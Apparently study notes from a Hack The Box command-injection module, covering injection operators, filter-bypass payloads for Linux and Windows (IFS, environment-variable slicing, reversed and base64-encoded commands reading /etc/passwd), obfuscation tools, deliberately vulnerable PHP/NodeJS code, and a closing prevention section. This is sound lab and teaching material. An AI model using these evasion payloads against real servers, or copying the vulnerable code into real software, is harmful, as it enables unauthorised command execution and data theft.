# Command Injections

## **Injection Operators**

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `||` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ```` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

**Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (````) or with a sub-shell operator (`$()`).**

# **Linux**

## **Filtered Character Bypass**

| **Code** | **Description** |
| --- | --- |
| `printenv` | Can be used to view all environment variables |
| **Spaces** |  |
| `%09` | Using tabs instead of spaces |
| `${IFS}` | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}` | Commas will be replaced with spaces |
| **Other Characters** |  |
| `${PATH:0:1}` | Will be replaced with `/` |
| `${LS_COLORS:10:1}` | Will be replaced with `;` |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`) |

---

## **Blacklisted Command Bypass**

| **Code** | **Description** |
| --- | --- |
| **Character Insertion** |  |
| `'` or `"` | Total must be even |
| `$@` or `\` | Linux only |
| **Case Manipulation** |  |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
| **Reversed Commands** |  |
| `echo 'whoami' | rev` | Reverse a string |
| `$(rev<<<'imaohw')` | Execute reversed command |
| **Encoded Commands** |  |
| `echo -n 'cat /etc/passwd | grep 33' | base64` | Encode a string with base64 |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string |

---

# **Windows**

## **Filtered Character Bypass**

| **Code** | **Description** |
| --- | --- |
| `Get-ChildItem Env:` | Can be used to view all environment variables - (PowerShell) |
| **Spaces** |  |
| `%09` | Using tabs instead of spaces |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD) |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell) |
| **Other Characters** |  |
| `%HOMEPATH:~0,-17%` | Will be replaced with `\` - (CMD) |
| `$env:HOMEPATH[0]` | Will be replaced with `\` - (PowerShell) |

---

## **Blacklisted Command Bypass**

| **Code** | **Description** |
| --- | --- |
| **Character Insertion** |  |
| `'` or `"` | Total must be even |
| `^` | Windows only (CMD) |
| **Case Manipulation** |  |
| `WhoAmi` | Simply send the character with odd cases |
| **Reversed Commands** |  |
| `"whoami"[-1..-20] -join ''` | Reverse a string |
| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
| **Encoded Commands** |  |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with base64 |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string |

# Introduction to Command Injections

## Overview

- **Command Injection** vulnerabilities allow execution of system commands directly on a server.
- Successful exploitation can lead to full network compromise.
- These vulnerabilities occur when user-controlled input is used to execute system commands without proper sanitization.

## What are Injections?

- Injection vulnerabilities rank [#3 in the **OWASP Top 10 Web App Risks**](https://owasp.org/www-project-top-ten/) due to their severity and prevalence.
- Injection happens when user-controlled input is treated as part of a command or query, leading to unintended behavior.

### Common Types of Injections

| **Injection Type** | **Description** |
| --- | --- |
| **OS Command Injection** | User input is executed as part of an OS command. |
| **Code Injection** | User input is evaluated as code. |
| **SQL Injection** | User input is used in an SQL query. |
| **Cross-Site Scripting (XSS)/HTML Injection** | User input is directly displayed on a web page. |
- Other types include **LDAP**, **NoSQL**, **HTTP Header**, **XPath**, **IMAP**, and **ORM** injections.
- Injections can happen whenever user input is not properly sanitized and can escape its context, allowing manipulation of the parent query.

## OS Command Injections

- These occur when user input is used directly or indirectly in a command executed by the back-end server.
- Various web programming languages have built-in functions to execute system commands, and improper handling can lead to vulnerabilities.

### PHP Example

Vulnerable code in PHP:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

- **Explanation**: The `filename` parameter is directly inserted into the `system` command without sanitization, making it vulnerable to OS command injection.

### NodeJS Example

Vulnerable code in NodeJS:

```jsx
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
});
```

- **Explanation**: The `filename` parameter in the `GET` request is directly used in the command, exposing the application to a command injection attack.

- Command Injection is not limited to specific languages; it can affect any environment if system commands are executed using unsanitized user input.
- Other applications (not just web) that pass user input to command execution functions are also vulnerable.

# Injecting Commands

| **Injection Type** | **Operators** |
| --- | --- |
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00` |
| Object Injection | `;` `&` `|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

# Filter Evasion

## Blacklisted Characters

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

## Bypassing Space Filters in Command Injections

- **Command Injection Detection**: Systems often employ filters to detect and prevent command injection attempts.
- **Bypassing Filters**: There are multiple techniques to bypass these filters, focusing on **space character** bypassing as a common example.

Bypass Blacklisted Operators

- Some common injection operators are blacklisted, but the **new-line character** (`\\\\n`) is often allowed.
- New-line characters can append commands in both Linux and Windows environments.

Bypass Blacklisted Spaces

- Spaces are frequently blacklisted, particularly in inputs like IP addresses where spaces are unexpected.
- However, there are several methods to include a space-like effect without using an actual space.

### Techniques to Bypass Space Filters

1. **Using Tabs**:
    - Replace spaces with **tabs** (`%09`).
    - Tabs are treated similarly to spaces by both Linux and Windows.
    
    **Example**:
    
    ```bash
    127.0.0.1%0a%09whomi
    ```
    
- Successfully bypassed the filter using a tab character.
1. **Using `$IFS` (Internal Field Separator)**:
    - `$IFS` is a Linux environment variable, defaulting to a space and tab.
    - Use `${IFS}` in place of spaces.
    
    **Example**:
    
    ```bash
    127.0.0.1%0a${IFS}whoami
    ```
    
    - Successfully bypassed the space filter.
2. **Brace Expansion**:
    - A Bash feature that expands arguments wrapped in braces, adding spaces implicitly.
    
    **Example**:
    
    ```bash
    {ls,-la}
    ```
    
    - This executes `ls -la` without including an actual space.

### Examples of Commands Without Spaces

- **Brace Expansion** can be used in command injection attempts:
    
    ```bash
    127.0.0.1%0a{ls,-la}
    ```
    
    - Command executes correctly without direct use of spaces.

- More techniques for bypassing space filters can be explored through resources like [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space), which offers a detailed guide on writing commands without spaces.

# Bypassing Other Blacklisted Characters

In cases where characters like slashes (/) or backslashes (\) are blacklisted, several techniques can be used to produce them or bypass filters.

## Linux Techniques

### Using Environment Variables

Environment variables in Linux can be leveraged to bypass character filters:

```bash
DarkSideDani@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

- **Slashes**: The `$PATH` variable can be manipulated to extract the `/` character:
    
    ```bash
    ${PATH:0:1}  # Yields '/'
    ```
    
- **Semi-colon**: Similar extraction can be done for other characters like `;`. The example below shows how to get a semi-colon using `LS_COLORS`:
    
    ```bash
    ${LS_COLORS:10:1}  # Yields ';
    ```
    

**Exercise**: Use the `printenv` command to explore environment variables that might contain useful characters.

### Payload Example

Combining extracted characters in a payload:

```bash
127.0.0.1${LS_COLORS:10:1}${IFS}  # Payload bypassing filters

#In Burp:
ip=127.0.0.1%0als$IFS-la

##
ip=127.0.0.1%0als$IFS${PATH:0:1}home
#This payload aims to:
#Terminate any previous command using %0a.
#Execute a command to list the contents of the /home directory by cleverly bypassing input filters using $IFS and ${PATH:0:1} tricks.
```

### Character Shifting

Characters can be shifted using ASCII manipulation:

- Use `tr` to shift characters by 1:
    
    ```bash
    echo $(tr '!-}' '"-~'<<<[)  # Shifts '[' to ''
    echo $(tr '!-}' '"-~'<<<:)  # We get ;
    ```
    

## Windows Techniques

### Command Line (CMD)

Use environment variables similarly to Linux:

- **Slash Extraction**: Using `%HOMEPATH%`:
    
    ```
    echo %HOMEPATH:~6,-11%  # Yields ''
    ```
    

### PowerShell

Environment variables in PowerShell can also be manipulated:

- **Slash Extraction**: Accessing specific characters:
    
    ```powershell
    $env:HOMEPATH[0]  # Yields ''
    ```
    
- Use `Get-ChildItem Env:` to explore environment variables for other characters.

<aside>
💡

**These techniques allow bypassing filters that restrict certain characters by:**

1. **Extracting needed characters from existing environment variables.**
2. **Shifting characters using ASCII values.**
3. **Exploring system-defined variables creatively to manipulate output.**
</aside>

# Bypassing Blacklisted Commands

Command blacklisting involves filtering specific words (commands) to prevent unauthorized actions. However, we can bypass such filters using various techniques to obfuscate commands.

## Command Blacklisting Example

![image.png](image%2053.png)

A basic command blacklist filter in `PHP` would look like the following:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

This code checks for exact matches of blacklisted words, allowing for obfuscation strategies to bypass it.

## Obfuscation Techniques

### General Techniques (Linux & Windows)

Certain characters can be inserted into commands without affecting their execution:

- **Single and Double Quotes**: These are ignored by shells if evenly used:
    
    ```bash
    w'h'o'am'i  # Outputs: whoami
    w"h"o"am"i  # Outputs: whoami
    ```
    
    - Note: Do not mix quote types, and ensure an even count.

**Understanding the Payload**:

The example payload is:

```
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

Here's a breakdown of this payload:

- `ip=127.0.0.1`: This part is likely irrelevant to the file reading attack. It might be part of a larger web request or query.
- `%0a`: This is a URL-encoded newline character (`\n`). In this context, it's used to separate the `ip` part from the next command execution attempt.
- `c'a't`: This breaks the `cat` command into parts using single quotes (`'`) to potentially bypass filters that block direct execution of `cat`.
- `${IFS}`: This stands for the "Internal Field Separator," which is usually a space character in bash. It’s often used in obfuscated payloads to separate command arguments when a space is blocked by input sanitization.
- `${PATH:0:1}`: This uses parameter expansion to get the first character of the `PATH` variable, which is usually the forward slash (`/`). It's a clever way to construct the slash (`/`) without typing it directly, again to bypass filters.
- `home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`: This part attempts to access the file `/home/1nj3c70r/flag.txt` using obfuscation techniques.

### Example Walkthrough:

1. Start with checking `/`:
    
    ```bash
    l"s" ${PATH:0:1}
    ```
    
    If you see a `home` directory, proceed.
    
2. Check `/home`:
    
    ```bash
    l"s" ${PATH:0:1}home
    ```
    
    If you see `1nj3c70r`, proceed.
    
3. Check `/home/1nj3c70r`:
    
    ```bash
    l"s" ${PATH:0:1}home${PATH:0:1}1nj3c70r
    ```
    
4. If you see `flag.txt`, read it:
    
    ```bash
    c"a"t ${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
    ```
    

By following these steps, you can systematically narrow down the target file's location without directly knowing the initial path.

### Linux-Specific Techniques

Other Linux-specific characters can also bypass filters:

- **Backslash (\)** and **Positional Parameter `$@`**:
    
    ```bash
    who$@ami  # Outputs: whoami
    w\\ho\\am\\i  # Outputs: whoam
    ```
    
    - No need for an even count with these characters.

**Exercise**: Try using `who$@ami` and `w\\ho\\am\\i` in a filtered environment to see if they work. If not, consider bypassing using techniques from previous sections.

### Windows-Specific Techniques

For Windows, certain characters can also be ignored:

- **Caret (^)**: A character that doesn't affect command execution:
    
    ```
    who^ami  # Outputs: whoami
    ```
    

<aside>
💡

These basic techniques allow bypassing command filters by:

1. Obfuscating commands with characters like quotes that are ignored by shells.
2. Using platform-specific ignored characters to bypass filters.
3. Experimenting with different characters if the initial bypass fail
</aside>

# Advanced Command Obfuscation

Advanced filtering solutions like Web Application Firewalls (WAFs) may require sophisticated techniques to bypass command restrictions.

## Case Manipulation

Altering the case of command characters can sometimes bypass filters:

- **Windows**: Commands are case-insensitive (PowerShell and CMD):
    
    ```powershell
    WhOaMi  # Outputs: whoami
    ```
    
- **Linux**: Case-sensitive, requiring conversion to lower-case for execution:
    
    ```bash
    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  # Outputs: whoami
    ```
    
    - Replace spaces with tabs (`%09`) to avoid filtered characters.
    
    ![image.png](image%2054.png)
    

**Alternative Method**:

```bash
$(a="WhOaMi";printf %s "${a,,}")  # Converts to lowercase
```

## Reversed Commands

Reverse commands to avoid exact blacklist matches:

- Reverse the string and execute with a sub-shell:
    
    ```bash
    echo 'whoami' | rev         # Outputs: imaohw
    $(rev<<<'imaohw')           # Executes whoami
    ```
    
    - **Windows** example:
    
    ```powershell
    "whoami"[-1..-20] -join ''  # Outputs: imaohw
    iex "$('imaohw'[-1..-20] -join '')"
    ```
    

## Encoded Commands

Encoding commands avoids filters that block certain characters:

- **Base64 Encoding Example (Linux)**:
    
    ```bash
    echo -n 'cat /etc/passwd | grep 33' | base64
    # Yields: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
    
    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
    
    # Example:
    ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
    
    # Another example:
    echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
    
    ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=) # url encoding included where space is %09
    
    ```
    
    - Replace spaces to avoid filtering issues.
    - Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.
- **Base64 Encoding (Windows)**:
    
    ```powershell
    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
    # Yields: dwBoAG8AYQBtAGkA
    ```
    
    - We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:
    
    ```bash
    DarkSideDani@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
    
    dwBoAG8AYQBtAGkA
    ```
    
    Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:
    
    ```bash
    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
    darksidedani
    ```
    

**-Alternative Encoding Tools**:

- Use `openssl` or `xxd` for hex encoding.
- Replace `bash` with `sh` if it’s filtered.

![image.png](image%2055.png)

<aside>
💡

Techniques to bypass advanced filters:

1. **Case Manipulation**: Change the casing of commands.
2. **Reversed Commands**: Reverse command strings and execute.
3. **Encoded Commands**: Encode commands with tools like `base64`.
4. Utilize shell-specific features to avoid character restrictions.

These methods, combined with previous insertion techniques, provide robust ways to evade filters. Tools and additional obfuscation methods are available on resources like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).

</aside>

# Evasion Tools

If we are dealing with advanced security tools, we may not be able to use basic, manual obfuscation techniques. In such cases, it may be best to resort to automated obfuscation tools. This section will discuss a couple of examples of these types of tools, one for `Linux` and another for `Windows.`

## Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```bash
DarkSideDani@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
DarkSideDani@htb[/htb]$ cd Bashfuscator
DarkSideDani@htb[/htb]$ pip3 install setuptools==65
DarkSideDani@htb[/htb]$ python3 setup.py install --user
```

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

```bash
DarkSideDani@htb[/htb]$ cd ./bashfuscator/bin/
DarkSideDani@htb[/htb]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] ...SNIP...

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
...SNIP...
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

```bash
DarkSideDani@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:

```bash
DarkSideDani@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:

```bash
DarkSideDani@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

## Windows (DOSfuscation)

There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:

```bash
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

<aside>
💡

Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. This tool is installed by default in your `Pwnbox` instance. You can also find installation instructions at this [link](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).

</aside>

# Command Injection Prevention

We should always avoid using functions that execute system commands, especially if we are using user input with them. Even when we are not directly inputting user input into these functions, a user may be able to indirectly influence them, which may eventually lead to a command injection vulnerability.

Instead of using system command execution functions, we should use built-in functions that perform the needed functionality, as back-end languages usually have secure implementations of these types of functionalities. For example, suppose we wanted to test whether a particular host is alive with `PHP`. In that case, we may use the `fsockopen` function instead, which should not be exploitable to execute arbitrary system commands.

## Input Validation

Whether using built-in functions or system command execution functions, we should always validate and then sanitize the user input. Input validation is done to ensure it matches the expected format for the input, such that the request is denied if it does not match. In our example web application, we saw that there was an attempt at input validation on the front-end, but `input validation should be done both on the front-end and on the back-end`.

In `PHP`, like many other web development languages, there are built in filters for a variety of standard formats, like emails, URLs, and even IPs, which can be used with the `filter_var` function, as follows:

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

If we wanted to validate a different non-standard format, then we can use a Regular Expression `regex` with the `preg_match` function. The same can be achieved with `JavaScript` for both the front-end and back-end (i.e. `NodeJS`), as follows:

```php
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

Just like `PHP`, with `NodeJS`, we can also use libraries to validate various standard formats, like [is-ip](https://www.npmjs.com/package/is-ip) for example, which we can install with `npm`, and then use the `isIp(ip)` function in our code. You can read the manuals of other languages, like [.NET](https://learn.microsoft.com/en-us/aspnet/web-pages/overview/ui-layouts-and-themes/validating-user-input-in-aspnet-web-pages-sites) or [Java](https://docs.oracle.com/cd/E13226_01/workshop/docs81/doc/en/workshop/guide/netui/guide/conValidatingUserInput.html?skipReload=true), to find out how to validate user input on each respective language.

## **Input Sanitization**

The most critical part for preventing any injection vulnerability is input sanitization, which means removing any non-necessary special characters from the user input. Input sanitization is always performed after input validation. Even after we validated that the provided user input is in the proper format, we should still perform sanitization and remove any special characters not required for the specific format, as there are cases where input validation may fail (e.g., a bad regex).

In our example code, we saw that when we were dealing with character and command filters, it was blacklisting certain words and looking for them in the user input. Generally, this is not a good enough approach to preventing injections, and we should use built-in functions to remove any special characters. We can use `preg_replace` to remove any special characters from the user input, as follows:

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

As we can see, the above regex only allows alphanumerical characters (`A-Za-z0-9`) and allows a dot character (`.`) as required for IPs. Any other characters will be removed from the string. The same can be done with `JavaScript`, as follows:

```jsx
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

We can also use the DOMPurify library for a `NodeJS` back-end, as follows:

```jsx
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

In certain cases, we may want to allow all special characters (e.g., user comments), then we can use the same `filter_var` function we used with input validation, and use the `escapeshellcmd` filter to escape any special characters, so they cannot cause any injections. For `NodeJS`, we can simply use the `escape(ip)` function. `However, as we have seen in this module, escaping special characters is usually not considered a secure practice, as it can often be bypassed through various techniques`.

For more on user input validation and sanitization to prevent command injections, you may refer to the [Secure Coding 101: JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) module, which covers how to audit the source code of a web application to identify command injection vulnerabilities, and then works on properly patching these types of vulnerabilities.

---

## **Server Configuration**

Finally, we should make sure that our back-end server is securely configured to reduce the impact in the event that the webserver is compromised. Some of the configurations we may implement are:

- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
- Reject double-encoded requests and non-ASCII characters in URLs
- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))

In the end, even after all of these security mitigations and configurations, we have to perform the penetration testing techniques we learned in this module to see if any web application functionality may still be vulnerable to command injection. As some web applications have millions of lines of code, any single mistake in any line of code may be enough to introduce a vulnerability. So we must try to secure the web application by complementing secure coding best practices with thorough penetration testing.